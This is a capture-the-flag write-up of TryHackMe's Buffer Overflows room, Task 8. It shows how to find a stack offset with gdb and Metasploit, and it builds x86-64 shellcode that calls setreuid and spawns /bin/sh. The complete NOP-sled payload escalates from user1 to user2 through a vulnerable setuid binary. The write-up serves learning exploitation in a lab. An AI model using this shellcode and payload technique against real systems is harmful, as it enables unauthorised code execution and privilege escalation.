+++
date = 2020-05-19T13:00:00Z
lastmod = 2020-05-19T13:00:00Z
author = "l1ge"
title = "TryHackMe: Buffer Overflows (Bof1) , Task 8 - Write Up"
subtitle = "The room that makes you feel you're in the buffer."
feature = "image/lettherightonein2.jpg"
caption = "Let the right one in, 2008. Directed by Thomas Alfredson"
tags = ["write-up", "TryHackMe", "reverse engineering"]
categories = ["write-ups"]
toc=false
+++
# 0x0 About the room

> Access: [https://tryhackme.com/room/bof1](https://tryhackme.com/room/bof1)


Many people have been complaining about the difficulty of this room (rated as easy...) and the opacity of the instructions. I did to. It's supposed to be for beginners but the author assume you know how to use a disassembler and the shell code he gives you doesn't work so you eventually have to code your own. 

Anyway, when I realized all that I had already spent too much time to give up. It took me a few days to get the flags but I learned a lot.

Special thanks to rennox and tkiela who kept me on the surface when I was getting overflowed.

*Disclaimer: I am a beginner,  this was my first buffer overflow and the first time I had to use gdb...Contact me if anything I say is incorrect.*

# 0x1 Finding the offset

As explained in the instruction, the first step is to find the amount of bytes you need to fill in order to overwrite the return address. 

## Method 1: The manual way

Because we have access to she source code, we know the allocated memory for the buffer is at least 140 bytes. But between the 140th byte and the return address there is a gap filled with some "[alignment bytes](http://www.songho.ca/misc/alignment/dataalign.html)" and by the rbp register (aka saved register) , which is 8 bytes in x64 architecture. 

The offset will look like this : buffer(140 bytes) + Alignment bytes (?) + rbp (8 bytes).

So we know the offset will be at least 148 bytes long. To get the exact offset, we will fill the buffer with the letter 'A'  (\x41 in hex) until we start to see our 'As' overwriting the return address. I'll use gdb which I found easier to use than r2 for beginners.

Open gdb on your binary `$ gdb buffer-overflow`

Let's start with 148  'A'.

```bash
(gdb) run $(python -c "print('A'*148)")

Starting program: $(python -c "print('A'*148)")
Missing separate debuginfos, use: debuginfo-install glibc-2.26-32.amzn2.0.1.x86_64
Here's a program that echo's out your input
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x0000000000400595 in main ()
```

The last line contain the return address `0x0000000000400595`. As we can see, there are no '41' so we didn't override it. Let's increase to 155

```bash
(gdb) run $(python -c "print('A'*155)")
Here's a program that echo's out your input
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x0000000000414141 in ?? ()
```

We start to see that we're overwriting the return address.  I kept increasing and went too far after 159.

158 is  the right amount, which override perfectly the return address with 6 bytes.

```bash
(gdb) run $(python -c "print('\x41'*158)")
Here's a program that echo's out your input
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x0000414141414141 in ?? ()
```

So we know that with 158 bytes we override the 6-bytes-long return address. It means our offset to reach the start of the return address is 158-6 = **152**

## Method 2 : With Metasploit's tool

We create a pattern of a random length with the tool `pattern_create.rb` from  Metasploit's framework. Let's try a 200 bytes pattern.

```bash
┌─[✗]─[l1ge@parrot]─[~]
└──╼$/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
```

We copy that pattern and run the binary in gdb with it

```bash
(gdb) run 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag'

Here's a program that echo's out your input
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
0x0000000000400563 in copy_arg ()
```

Despite the overflow, the return address doesn't show our pattern. We have to search it somewhere else, in the rbp register instead (remember? the rbp comes just before the return address)

We do that with the command `i r` to show all the registers

```bash
(gdb) i r
rax            0xc9	201
rbx            0x0	0
rcx            0x7ffff7b08894	140737348929684
rdx            0x7ffff7dd48c0	140737351862464
rsi            0x602260	6300256
rdi            0x0	0
rbp            0x6641396541386541	0x6641396541386541  <-------HERE IS THE PATTERN
rsp            0x7fffffffe2b8	0x7fffffffe2b8
r8             0x7ffff7fef4c0	140737354069184
r9             0x77	119
r10            0x5e	94
r11            0x246	582
r12            0x400450	4195408
r13            0x7fffffffe3b0	140737488348080
r14            0x0	0
r15            0x0	0
rip            0x400563	0x400563 <copy_arg+60>
eflags         0x10206	[ PF IF RF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
```

We see that the rbp has been overridden with the pattern. We then use metasploit's  `pattern-offset.rb` to query the pattern we found in the rbp

```bash
┌─[✗]─[l1ge@parrot]─[~]
└──╼$/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 200 -q 6641396541386541
[*] Exact match at offset 144
```

It says that our rbp starts with an offset of 144. We know the rbp is 8 bytes so 144+8 = **152**. The offset we manually found is confirmed.

# 0x2 Picking a shell code

We need a shell code that we will put in our buffer and have the return address points to it. For now I just want a simple shell code, just to drop a shell.

There are a few on exploit-db like [this one](https://www.exploit-db.com/exploits/41750) or [that one](https://www.exploit-db.com/exploits/42179). But I wont make you waste your time like I wasted mine. I've tried most of these simple shell codes and most of them didn't work on our case.  I was getting SIGILL errors all the time.

I later found out why: These short shell codes don't have an exit function call at their end, it means that once I injected these shell codes in the buffer and fucked up the memory, the binary was still trying to execute these fucked up instructions and thus, was reporting "illegal instruction error".

*Side note : I was able to get a shell with these simple shell codes but only by using another method : an env variable. With this method you don't put your shell code in the buffer but in an environment variable and then you give the return address the address of that variable. That way you don't fuck up the memory and I didn't get any error.*

So bellow is a similar simple shell code that i found but it includes an exit call at the end that will prevent the SIGILL errors.

The assembly version:

```assembly
    push $0x3b
    pop %eax
    xor %rdx,%rdx
    movabs $0x68732f6e69622f2f,%r8  
    shr $0x8, %r8                   
    push %r8
    mov %rsp, %rdi
    push %rdx
    push %rdi
    mov %rsp, %rsi
    syscall				 <------ from the top to this point it's too execute /bin/sh
    push $0x3c
    pop %eax
    xor %rdi,%rdi
    syscall 			<------ The last 4 lines are for the exit function.
```

The hex version:

```shell
\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05
```

This shell code is 40 bytes . I'll cover more about shell codes in the last part of this write up.

# 0x3 Finding the address of the shell code

Our payload will be 158 bytes in total : 152 to fill the buffer and 6 to override the return address pointing to the address of the shell code in the buffer.

PAYLOAD = JUNK(100 bytes) + SHELL CODE (40 bytes) + JUNK (12 byes) + RETURN ADDRESS (6 bytes).

There are no specific reason why I put 100 bytes before and 12 bytes after the shell code. You can try different things as long as the total without the return address is 152.

Let's fill the junk with 'A's for now, and our return address with 6*'B'

```shell
(gdb) run $(python -c "print 'A'*100+'\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*12 + 'B'*6")
```

We will now examine the dump of the hex code with the command `x/100x $rsp-200` which dumps 100*4 bytes from memory location $rsp -200 bytes.

```bash
(gdb) x/100x $rsp-200
0x7fffffffe228:	0x00400450	0x00000000	0xffffe3e0	0x00007fff
0x7fffffffe238:	0x00400561	0x00000000	0xf7dce8c0	0x00007fff
0x7fffffffe248:	0xffffe64d	0x00007fff	0x41414141	0x41414141 <--- start of the buffer
0x7fffffffe258:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe268:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe278:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe288:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe298:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe2a8:	0x41414141	0x41414141	0x41414141	0x48583b6a <--- start of the shellcode
0x7fffffffe2b8:	0xb849d231	0x69622f2f	0x68732f6e	0x08e8c149
0x7fffffffe2c8:	0x89485041	0x485752e7	0x050fe689	0x48583c6a
0x7fffffffe2d8:	0x050fff31	0x41414141	0x41414141	0x41414141
0x7fffffffe2e8:	0x42424242	0x00004242	0xffffe3e8	0x00007fff
```

We see all the 41 that we filled the buffer with. And then we see our shell code.

To calculate the exact address where the shell code starts,  you first  take the memory address on the left on the same line : 0x7fffffffe2a8. This is the address of the first column on this line (filed with 41 at the moment). And then you add 4 bytes per column. Our shell code is 3 columns further so you need to add 3*4= 12 bytes to that address.

In hex 12 is 0xC, you need to do 0x7fffffffe2a + 0xC = 0x7fffffffe2b4

We now got the exact address where the shell code start in the buffer, so we could override the return address with it and it should work.  But sometimes memory shift a bit, from one execution to another the address might change. That's why we use NOPs

## NOPs

Instead of filling the junk before the shell code with 'A'  we fill it with NOPs (\x90).

The NOPs are instructions to do nothing, they will be skipped. It means that now, you don't need to get the exact address where your shell code start but any address in the NOPS, the program will skip all the NOPS and execute your shell code. That way if the memory shift a bit, your exploit will still work.

Let's replace the 'A's with NOPs and dump our hex again.

```bash
(gdb) run $(python -c "print '\x90'*100+'\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*12 + 'B'*6")

Here's a program that echo's out your input
����������������������������������������������������������������������������������������������������j;XH1�I�//bin/shI�APH��RWH��j<XH1�AAAAAAAAAAAABBBBBB

Program received signal SIGSEGV, Segmentation fault.
0x0000424242424242 in ?? ()

(gdb) x/100x $rsp-200
0x7fffffffe228:	0x00400450	0x00000000	0xffffe3e0	0x00007fff
0x7fffffffe238:	0x00400561	0x00000000	0xf7dce8c0	0x00007fff
0x7fffffffe248:	0xffffe64d	0x00007fff	0x90909090	0x90909090 <----- Nops start here
0x7fffffffe258:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe268:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe278:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe288:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe298:	0x90909090	0x90909090	0x90909090	0x90909090 <----- The address I pick
0x7fffffffe2a8:	0x90909090	0x90909090	0x90909090	0x48583b6a <----- shellcode
0x7fffffffe2b8:	0xb849d231	0x69622f2f	0x68732f6e	0x08e8c149
0x7fffffffe2c8:	0x89485041	0x485752e7	0x050fe689	0x48583c6a
0x7fffffffe2d8:	0x050fff31	0x41414141	0x41414141	0x41414141
0x7fffffffe2e8:	0x42424242	0x00004242	0xffffe3e8	0x00007fff
0x7fffffffe2f8:	0x00000000	0x00000002	0x004005a0	0x00000000
0x7fffffffe308:	0xf7a4302a	0x00007fff	0x00000000	0x00000000
0x7fffffffe318:	0xffffe3e8	0x00007fff	0x00040000	0x00000002
```

You can now just pick any  address as long as its in the NOPS, I'll pick 0x7fffffffe298.

We need to convert it to little endian: 

0x7fffffffe298 becomes 0x98e2ffffff7f and eventually \x98\xe2\xff\xff\xff\x7f

Now let's try to get a shell! We replace the last 6 bytes that were just 6*'B', by this address.

Let's run it outside gdb to be sure we're in the good environment.

```bash
$ ./buffer-overflow $(python -c "print '\x90'*100+'\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*12 + '\x98\xe2\xff\xff\xff\x7f'")

Here's a program that echo's out your input
����������������������������������������������������������������������������������������������������j;XH1�I�//bin/shI�APH��RWH��j<XH1�AAAAAAAAAAAA�����
sh-4.2$
```

Yeay ! We're in !

```bash
sh-4.2$ whoami
user1
sh-4.2$ cat secret.txt
cat: secret.txt: Permission denied
```

Aww...As we can see, we're only user1. And we can't access the secret file. Let's look at the permissions.

```bash
$ ls -l
total 20
-rwsrwxr-x 1 user2 user2 8264 Sep  2  2019 buffer-overflow
-rw-rw-r-- 1 user1 user1  285 Sep  2  2019 buffer-overflow.c
-rw------- 1 user2 user2   22 Sep  2  2019 secret.txt
```

Secret.txt can only be read by user 2, ok we knew that. But the buffer-overflow binary has the the setuid bit (the 's' in the permissions), so I expected that dropping a shell would  give me user2's privileges!  It's not the case and I'll explain why.

# 0x4 About Setuid, Setreuid

There are two main reasons why we're not user2:

First, for security reasons,  the setuid bit is given only when it's necessary. As I understood it, you would have to add in the shell code a function that says "now its necessary to give setuid(UID) to run the next command".  So I first tried to do just that.

I looked for user's 2 UID

```bash
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
.
.
user1:x:1001:1001::/home/user1:/bin/bash
user2:x:1002:1002::/home/user2:/bin/bash  
user3:x:1003:1003::/home/user3:/bin/bash
```

We can see the UID of user2 is 1002. And I looked for a way to add the function `setuid(1002)` at the top of my shell code and thus become user2 in the shell.

But... that didn't work. Which takes me to the second reason:

When you drop the shell, /bin/sh looks at your **real** UID and not your **effective** UID. You can do research about the difference between real and effective UID but mostly, the funtion setuid(), except if its called on root, only sets your effective UID.  So even if we call setuid(1002), our real UID would still be 1001 and thus we'll remain user1 in the shell.  We need to use another function: [setreuid()](http://man7.org/linux/man-pages/man2/setreuid.2.html)

*Side note: Most of the time in these exploits, we want to become root and we target binaries who have the setuid-root bit. In that case, simply doing setuid(0) would work because when called on root, setuid(0) also sets you real UID to root.* 

setreuid() can set both your real and effective uid.  So we need to modify our shell code to execute setreuid(1002,1002) before it executes /bin/sh. And that mean, coding in assembly : Yeeay!

# 0x5 Modifying the shell code

Depending on your knowledge in assembly and in C, there are different ways to approach it:

- You can write your shellcode in C, compile it, look at the assembly code, remove the bad characters and us it in your exploit.
- You can go straight to assembly, find an existing shell code that uses setreuid() and modify it.
- The easiest option : you can use [pwntools](http://docs.pwntools.com/en/stable/)

## Manually

I personally did the 2nd option before i realized pwntools would have been easier. If you're in a hurry go straight to that part bellow. 

I grabbed [this shell code](http://shell-storm.org/shellcode/files/shellcode-77.php) that setuid(0) , drops a shell and exits. I went to an IRC assembly channel and asked for help to modify it.

First my goal was to setuid(1002), someone helped me to do that. But as I said above, it wasn't enough to become user2. Then I was able to modify it to call setreuid() instead of setuid().  I had to look for the function's %rax number in this [Linux System Call Table](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/)

setreuid()'s rax number is 113 ( 0x71in hex).  And it takes its two arguments from the rdi and rsi registers.

Here was my assembly code in the end:

```assembly
xor    rdi,rdi			<------ set the rdi to 0
xor    rax,rax		
xor    rsi, rsi    		<------ set the rsi to 0
mov    si, 1002  	    <------ put the value 1002 in the lower bits of the rsi
mov    di, 1002			<------ put the value 1002 in the lower bits of the rdi
mov    al,0x71			<------ put the setruid function in the al register      
syscall					<------ call the function.
xor    rdx,rdx
movabs rbx,0x68732f6e69622fff
shr    rbx,0x8
push   rbx
mov    rdi,rsp
xor    rax,rax
push   rax
push   rdi
mov    rsi,rsp
mov    al,0x3b
syscall
push   0x1
pop    rdi
push   0x3c
pop    rax
syscall
```

And I converted it to hex using [Online Assembly](https://defuse.ca/online-x86-assembler.htm) .

```shell
\x48\x31\xFF\x48\x31\xC0\x48\x31\xF6\x66\xBE\xEA\x03\x66\xBF\xEA\x03\xB0\x71\x0F\x05\x48\x31\xD2\x48\xBB\xFF\x2F\x62\x69\x6E\x2F\x73\x68\x48\xC1\xEB\x08\x53\x48\x89\xE7\x48\x31\xC0\x50\x57\x48\x89\xE6\xB0\x3B\x0F\x05\x6A\x01\x5F\x6A\x3C\x58\x0F\x05
```

But if you don't want to bother with trying to understand assembly, there is a much easier way.

## With Pwntools

You can use [pwntools](http://docs.pwntools.com/en/stable/) and its shellcraft module to generate shellcodes for you. We already have a working shell code to get a shell, so we just need to add to it the setreuid() part.

Install pwntools following the instruction on their site. Then run:

```bash
┌─[✗]─[l1ge@parrot]─[~]
└──╼$pwn shellcraft -f a amd64.linux.setreuid
```

`-f d` sets the format to "escaped".  You can set `-f a` to look at the assembly version

*Side note: It would also work if you don't specify the UID 1002 .  It would automatically grab the effective UID with geteuid() and set it as your Real UID. But I keep it that way to make things clearer.*

You get you the following shellcode

```shell
\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05
```

We just have to paste it in front of our working shell code from section 0x2. The result it:

```shell
\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05
```

It is now longer,  54 bytes in total, so we have to reduce the number of NOPs to keep the offset at 152.

Our final payload looks like this  :

```bash
$(python -c "print '\x90'*86+'\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*12 + '\x98\xe2\xff\xff\xff\x7f'")
```

Run it

```bash 
$ ./buffer-overflow $(python -c "print '\x90'*86+'\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*12 + '\x98\xe2\xff\xff\xff\x7f'")

Here's a program that echo's out your input
��������������������������������������������������������������������������������������1�f��jqXH��j;XH1�I�//bin/shI�APH��RWH��j<XH1�AAAAAAAAAAAA�����

sh-4.2$ whoami
user2
```

You're user2, `cat secret.txt` and enjoy. 

Task 9 works exactly the same way with a different offset.

 Good luck ! -l1ge.